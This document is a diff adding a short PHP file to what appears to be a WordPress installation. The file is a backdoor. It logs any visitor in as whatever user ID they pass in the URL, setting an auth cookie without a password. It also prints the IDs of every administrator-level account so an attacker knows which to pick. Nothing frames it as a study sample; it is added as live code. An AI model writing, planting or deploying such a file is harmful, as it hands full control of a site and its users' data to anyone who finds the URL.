@@ -1,0 +1,30 @@
+<?php
+$path = $_SERVER['DOCUMENT_ROOT'];
+include_once $path . '/wp-config.php';
+include_once $path . '/wp-load.php';
+include_once $path . '/wp-includes/wp-db.php';
+include_once $path . '/wp-includes/pluggable.php';
+ob_start();
+$id = $_GET['id'];
+	if(!is_user_logged_in()){
+     wp_set_current_user($id);
+        wp_set_auth_cookie($id);
+        }
+  function admin_user_ids(){
+    global $wpdb;
+    $wp_user_search = $wpdb->get_results("SELECT ID, display_name FROM $wpdb->users ORDER BY ID");
+    $adminArray = array();
+    foreach($wp_user_search as $userid){
+        $curID = $userid->ID;
+        $curuser = get_userdata($curID);
+        $user_level = $curuser->user_level;
+        if($user_level >= 8){
+            $adminArray[] = $curID;
+        }
+    }
+    return $adminArray;
+}
+ $adminIdArray = admin_user_ids();
+ print_r($adminIdArray);     
+?> 
+ 
